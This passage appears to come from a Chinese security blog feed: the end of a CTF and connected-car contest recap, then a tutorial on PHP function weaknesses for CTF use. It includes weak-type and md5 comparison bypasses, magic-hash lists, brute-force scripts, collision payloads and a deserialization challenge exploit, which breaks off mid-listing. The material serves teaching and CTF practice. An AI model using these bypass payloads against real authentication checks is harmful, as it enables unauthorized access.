程序本地代码执行，这里需要注意的是系统默认有一个守护进程会禁止安装 apk，需要通过 adb 获取 root 权限然后 kill 掉守护进程才能正常安装。</li><li>中间人攻击，劫持域名解析结果到本地，结合应用检查更新的功能，替换成恶意apk程序安装，但这里需要 http 协议通信的才可以成功。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>类似的比赛，夺旗赛可以先派 CTF 选手上，涉及车联网方面再让车联网大哥上。这次成绩不理想，没有其他的原因，菜是原罪，好好努力吧</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、第一天&quot;&gt;&lt;a href=&quot;#一、第一天&quot; class=&quot;headerlink&quot; title=&quot;一、第一天&quot;&gt;&lt;/a&gt;一、第一天&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;上午&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;CTF 夺旗，考验基础渗透能力，有些简单的题目 sqlmap 可以直接出，主要是 Web 和 Misc 方向的题目，一个半小时20多道题目，时间有点紧。没有提供网线，WiFi 连接内网，切换热点查资料不是很方便。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>PHP函数漏洞总结</title>
    <link href="https://jlkl.github.io/2020/08/26/PHP_01/"/>
    <id>https://jlkl.github.io/2020/08/26/PHP_01/</id>
    <published>2020-08-26T12:47:35.000Z</published>
    <updated>2020-08-26T12:53:09.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要针对 PHP 函数相关的漏洞的总结，可能会偏向 CTF 方面，内容肯定不全，有空的话会持续更新，欢迎各位表哥补充以及对文章错误之处进行斧正！</p><a id="more"></a><h2 id="1-弱类型安全问题"><a href="#1-弱类型安全问题" class="headerlink" title="1 弱类型安全问题"></a>1 弱类型安全问题</h2><h3 id="1-1-弱类型比较缺陷"><a href="#1-1-弱类型比较缺陷" class="headerlink" title="1.1 == 弱类型比较缺陷"></a>1.1 == 弱类型比较缺陷</h3><p><code>===</code> 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br><code>==</code> 在进行比较的时候，会先将字符串类型转化成相同，再比较</p><p>（1）字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值则为0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">"admin"</span>==<span class="number">0</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"1admin"</span>== <span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span>==<span class="number">0</span>) <span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>（2）在进行弱类型比较时，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">"0e123456"</span>==<span class="string">"0e99999"</span>); <span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>（3）当字符串当作数值来取值时，如果字符串中包含<code>.</code>、<code>e</code>、<code>E</code>或者数值超过整型范围内时，被当作float来取值，如果没有包含上述字符且在整形范围内，则该字符串会当作 int 来取值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$test=<span class="number">1</span> + <span class="string">"10.5"</span>; <span class="comment">// $test=11.5(float)</span></span><br><span class="line">$test=<span class="number">1</span>+<span class="string">"-1.3e3"</span>; <span class="comment">//$test=-1299(float)</span></span><br><span class="line">$test=<span class="number">1</span>+<span class="string">"bob-1.3e3"</span>;<span class="comment">//$test=1(int)</span></span><br><span class="line">$test=<span class="number">1</span>+<span class="string">"2admin"</span>;<span class="comment">//$test=3(int)</span></span><br><span class="line">$test=<span class="number">1</span>+<span class="string">"admin2"</span>;<span class="comment">//$test=1(int)</span></span><br></pre></td></tr></table></figure><p>（4）<code>ture</code> 和任意字符串弱类型相等，和非 0 数字若类型相等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">"admin"</span>== <span class="keyword">true</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"0admin"</span>== <span class="keyword">true</span>);<span class="comment">//true</span></span><br><span class="line">var_dump(<span class="number">7</span>==<span class="keyword">true</span>);<span class="comment">//true</span></span><br><span class="line">var_dump(<span class="number">1</span>==<span class="keyword">true</span>);<span class="comment">//true</span></span><br><span class="line">var_dump(<span class="number">0</span>==<span class="keyword">true</span>);<span class="comment">//false</span></span><br><span class="line">var_dump(<span class="number">-7</span>==<span class="keyword">true</span>);<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>附上类型比较表：</p><p><a href="https://www.php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/types.comparisons.php</a></p><h3 id="1-2-switch"><a href="#1-2-switch" class="headerlink" title="1.2 switch()"></a>1.2 switch()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"4admin"</span>;</span><br><span class="line"><span class="keyword">switch</span> ($a) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail1"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail2"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail3"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'flag&#123;xxxxxx&#125;'</span>;  <span class="comment">//结果输出flag</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"failall"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用php弱类型原理，<code>$a=&quot;4admin&quot;</code>在进行弱类型比较时会截取前面的4作为字符串的数值，正好可以匹配到<code>case 4</code></p><h3 id="1-3-md5"><a href="#1-3-md5" class="headerlink" title="1.3 md5()"></a>1.3 md5()</h3><ol><li>hash 比较缺陷</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'Username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">      $logined = <span class="keyword">true</span>;</span><br><span class="line">      $Username = $_GET[<span class="string">'Username'</span>];</span><br><span class="line">      $password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">       <span class="keyword">if</span> (!ctype_alpha($Username)) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line">       <span class="keyword">if</span> (!is_numeric($password) ) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line">       <span class="keyword">if</span> (md5($Username) != md5($password)) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line">       <span class="keyword">if</span> ($logined)&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"successful"</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"login failed!"</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>弱比较，hash 值为 0e 开头即可绕过，例如 <code>md5(&#39;240610708&#39;) == md5(&#39;QNKCDZO&#39;)</code></p><p>附上常见 0e 开头的md5和原值：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line"></span><br><span class="line"><span class="number">240610708</span></span><br><span class="line"><span class="number">0e462097431906509019562988736854</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span> </span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br></pre></td></tr></table></figure><p>双 md5：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$md5          md5($md5)</span><br><span class="line"><span class="number">0e00275209979</span> <span class="number">0e551387587965716321018342879905</span></span><br><span class="line"><span class="number">0e00506035745</span> <span class="number">0e224441551631909369101555335043</span></span><br><span class="line"><span class="number">0e00540451811</span> <span class="number">0e057099852684304412663796608095</span></span><br><span class="line"><span class="number">0e00678205148</span> <span class="number">0e934049274119262631743072394111</span></span><br><span class="line"><span class="number">0e00741250258</span> <span class="number">0e899567782965109269932883593603</span></span><br><span class="line"><span class="number">0e00928251504</span> <span class="number">0e148856674729228041723861799600</span></span><br><span class="line"><span class="number">0e01350016114</span> <span class="number">0e769018222125751782256460324867</span></span><br><span class="line"><span class="number">0e01352028862</span> <span class="number">0e388419153010508575572061606161</span></span><br><span class="line"><span class="number">0e01392313004</span> <span class="number">0e793314107039222217518920037885</span></span><br><span class="line"><span class="number">0e01875552079</span> <span class="number">0e780449305367629893512581736357</span></span><br><span class="line"><span class="number">0e01975903983</span> <span class="number">0e317084484960342086618161584202</span></span><br><span class="line"><span class="number">0e02042356163</span> <span class="number">0e335912055437180460060141819624</span></span><br><span class="line"><span class="number">0e02218562930</span> <span class="number">0e151492820470888772364059321579</span></span><br><span class="line"><span class="number">0e02451355147</span> <span class="number">0e866503534356013079241759641492</span></span><br><span class="line"><span class="number">0e02739970294</span> <span class="number">0e894318228115677783240047043017</span></span><br><span class="line"><span class="number">0e02760920150</span> <span class="number">0e413159393756646578537635311046</span></span><br><span class="line"><span class="number">0e02784726287</span> <span class="number">0e433955189140949269100965859496</span></span><br><span class="line"><span class="number">0e03298616350</span> <span class="number">0e851613188370453906408258609284</span></span><br><span class="line"><span class="number">0e03393034171</span> <span class="number">0e077847024281996293485700020358</span></span><br></pre></td></tr></table></figure><p><code>$md5 == md5($md5)</code>，0e+数字 md5 爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">'0e'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">breakit</span><span class="params">()</span>:</span></span><br><span class="line">    iters = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        s = prefix + str(iters)</span><br><span class="line">        hashed_s = hashlib.md5(s).hexdigest()</span><br><span class="line">        iters = iters + <span class="number">1</span></span><br><span class="line">        r = re.match(<span class="string">'^0e[0-9]&#123;30&#125;'</span>, hashed_s)</span><br><span class="line">        <span class="keyword">if</span> r:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] found! md5( &#123;&#125; ) ---&gt; &#123;&#125;"</span>.format(s, hashed_s)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] in &#123;&#125; iterations"</span>.format(iters)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">1000000</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] current value: &#123;&#125;       &#123;&#125; iterations, continue..."</span>.format(s, iters)</span><br><span class="line"></span><br><span class="line">breakit()</span><br></pre></td></tr></table></figure><p>PHP 版本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;;$i++)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"0e&#123;$i&#125;"</span>==md5(<span class="string">"0e&#123;$i&#125;"</span>))</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"[+] found! 0e&#123;$i&#125;"</span>); </span><br><span class="line">    <span class="keyword">elseif</span> ($i % <span class="number">1000000</span> === <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[+] current value: &#123;$i&#125;\n"</span>;</span><br></pre></td></tr></table></figure><ol start="2"><li>md5 碰撞</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>((string)$_POST[<span class="string">'param1'</span>]!==(string)$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"success!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个参数内容不同，但 md5 值相同的，可以使用 fastcoll 工具碰撞</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">para<span class="name">m1</span>=<span class="meta">%</span><span class="number">4</span>d<span class="meta">%</span>c<span class="number">9</span><span class="meta">%</span><span class="number">68</span><span class="meta">%</span>ff<span class="meta">%</span><span class="number">0</span>e<span class="meta">%</span>e<span class="number">3</span><span class="meta">%</span><span class="number">5</span>c<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">95</span><span class="meta">%</span><span class="number">72</span><span class="meta">%</span>d<span class="number">4</span><span class="meta">%</span><span class="number">77</span><span class="meta">%</span><span class="number">7</span>b<span class="meta">%</span><span class="number">72</span><span class="meta">%</span><span class="number">15</span><span class="meta">%</span><span class="number">87</span><span class="meta">%</span>d<span class="number">3</span><span class="meta">%</span><span class="number">6</span>f<span class="meta">%</span>a<span class="number">7</span><span class="meta">%</span>b<span class="number">2</span><span class="meta">%</span><span class="number">1</span>b<span class="meta">%</span>dc<span class="meta">%</span><span class="number">56</span><span class="meta">%</span>b<span class="number">7</span><span class="meta">%</span><span class="number">4</span>a<span class="meta">%</span><span class="number">3</span>d<span class="meta">%</span>c<span class="number">0</span><span class="meta">%</span><span class="number">78</span><span class="meta">%</span><span class="number">3</span>e<span class="meta">%</span><span class="number">7</span>b<span class="meta">%</span><span class="number">95</span><span class="meta">%</span><span class="number">18</span><span class="meta">%</span>af<span class="meta">%</span>bf<span class="meta">%</span>a<span class="number">2</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span>a<span class="number">8</span><span class="meta">%</span><span class="number">28</span><span class="meta">%</span><span class="number">4</span>b<span class="meta">%</span>f<span class="number">3</span><span class="meta">%</span><span class="number">6</span>e<span class="meta">%</span><span class="number">8</span>e<span class="meta">%</span><span class="number">4</span>b<span class="meta">%</span><span class="number">55</span><span class="meta">%</span>b<span class="number">3</span><span class="meta">%</span><span class="number">5</span>f<span class="meta">%</span><span class="number">42</span><span class="meta">%</span><span class="number">75</span><span class="meta">%</span><span class="number">93</span><span class="meta">%</span>d<span class="number">8</span><span class="meta">%</span><span class="number">49</span><span class="meta">%</span><span class="number">67</span><span class="meta">%</span><span class="number">6</span>d<span class="meta">%</span>a<span class="number">0</span><span class="meta">%</span>d<span class="number">1</span><span class="meta">%</span><span class="number">55</span><span class="meta">%</span><span class="number">5</span>d<span class="meta">%</span><span class="number">83</span><span class="meta">%</span><span class="number">60</span><span class="meta">%</span>fb<span class="meta">%</span><span class="number">5</span>f<span class="meta">%</span><span class="number">07</span><span class="meta">%</span>fe<span class="meta">%</span>a<span class="number">2</span></span><br><span class="line">para<span class="name">m2</span>=<span class="meta">%</span><span class="number">4</span>d<span class="meta">%</span>c<span class="number">9</span><span class="meta">%</span><span class="number">68</span><span class="meta">%</span>ff<span class="meta">%</span><span class="number">0</span>e<span class="meta">%</span>e<span class="number">3</span><span class="meta">%</span><span class="number">5</span>c<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">95</span><span class="meta">%</span><span class="number">72</span><span class="meta">%</span>d<span class="number">4</span><span class="meta">%</span><span class="number">77</span><span class="meta">%</span><span class="number">7</span>b<span class="meta">%</span><span class="number">72</span><span class="meta">%</span><span class="number">15</span><span class="meta">%</span><span class="number">87</span><span class="meta">%</span>d<span class="number">3</span><span class="meta">%</span><span class="number">6</span>f<span class="meta">%</span>a<span class="number">7</span><span class="meta">%</span>b<span class="number">2</span><span class="meta">%</span><span class="number">1</span>b<span class="meta">%</span>dc<span class="meta">%</span><span class="number">56</span><span class="meta">%</span>b<span class="number">7</span><span class="meta">%</span><span class="number">4</span>a<span class="meta">%</span><span class="number">3</span>d<span class="meta">%</span>c<span class="number">0</span><span class="meta">%</span><span class="number">78</span><span class="meta">%</span><span class="number">3</span>e<span class="meta">%</span><span class="number">7</span>b<span class="meta">%</span><span class="number">95</span><span class="meta">%</span><span class="number">18</span><span class="meta">%</span>af<span class="meta">%</span>bf<span class="meta">%</span>a<span class="number">2</span><span class="meta">%</span><span class="number">02</span><span class="meta">%</span>a<span class="number">8</span><span class="meta">%</span><span class="number">28</span><span class="meta">%</span><span class="number">4</span>b<span class="meta">%</span>f<span class="number">3</span><span class="meta">%</span><span class="number">6</span>e<span class="meta">%</span><span class="number">8</span>e<span class="meta">%</span><span class="number">4</span>b<span class="meta">%</span><span class="number">55</span><span class="meta">%</span>b<span class="number">3</span><span class="meta">%</span><span class="number">5</span>f<span class="meta">%</span><span class="number">42</span><span class="meta">%</span><span class="number">75</span><span class="meta">%</span><span class="number">93</span><span class="meta">%</span>d<span class="number">8</span><span class="meta">%</span><span class="number">49</span><span class="meta">%</span><span class="number">67</span><span class="meta">%</span><span class="number">6</span>d<span class="meta">%</span>a<span class="number">0</span><span class="meta">%</span>d<span class="number">1</span><span class="meta">%</span>d<span class="number">5</span><span class="meta">%</span><span class="number">5</span>d<span class="meta">%</span><span class="number">83</span><span class="meta">%</span><span class="number">60</span><span class="meta">%</span>fb<span class="meta">%</span><span class="number">5</span>f<span class="meta">%</span><span class="number">07</span><span class="meta">%</span>fe<span class="meta">%</span>a<span class="number">2</span></span><br></pre></td></tr></table></figure><p>最好使用 burp 发包，hackbar 插件有些时候会有问题</p><ol start="3"><li>处理数组问题</li></ol><p>PHP手册中的md5()函数的描述是<code>string md5 ( string $str [, bool $raw_output = false ] )</code>，md5()中的需要是一个string类型的参数。但是当你传递一个array时，md5()不会报错，只是会无法正确地求出array的md5值，并且返回<code>NULL</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(md5($_GET[<span class="string">'a'</span>]) == md5($_GET[<span class="string">'b'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"yes"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=<span class="number">1</span>&amp;b[]=<span class="number">2</span></span><br></pre></td></tr></table></figure><ol start="4"><li>处理 INF</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(md5(<span class="string">'INF'</span>));</span><br><span class="line"><span class="comment">//9517fd0bf8faa655990a4dffe358e13e</span></span><br><span class="line">var_dump(md5(<span class="number">9e999999</span>));<span class="comment">//9e999999即INF</span></span><br><span class="line"><span class="comment">//9517fd0bf8faa655990a4dffe358e13e</span></span><br></pre></td></tr></table></figure><p>即可满足 <code>md5($this-&gt;trick1) === md5($this-&gt;trick2)</code></p><ol start="5"><li>处理 0.1*0.1</li></ol><p><code>0.1*0.1</code> 实际上由于浮点数处理的原因，数值为 <code>0.010000000000000002</code></p><p>猜测 md5 函数处理时对小数的部分进行了舍弃，所以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(md5(<span class="number">0.01</span>));</span><br><span class="line"><span class="comment">//04817efd11c15364a6ec239780038862</span></span><br><span class="line">var_dump(md5(<span class="number">0.1</span>*<span class="number">0.1</span>));</span><br><span class="line"><span class="comment">//04817efd11c15364a6ec239780038862</span></span><br></pre></td></tr></table></figure><p><strong>Ciscn 2020 easytrick</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (string)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"你太长了"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_GET[<span class="string">'trick'</span>]);</span><br></pre></td></tr></table></figure><p>payload1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (string)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"你太长了"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> trick;</span><br><span class="line">$a-&gt;trick1=<span class="string">"INF"</span>;</span><br><span class="line">$a-&gt;trick2=<span class="number">9e999999</span>;</span><br><span class="line">var_dump(serialize($a));</span><br></pre></td></tr></table></figure><p>payload2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (string)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) 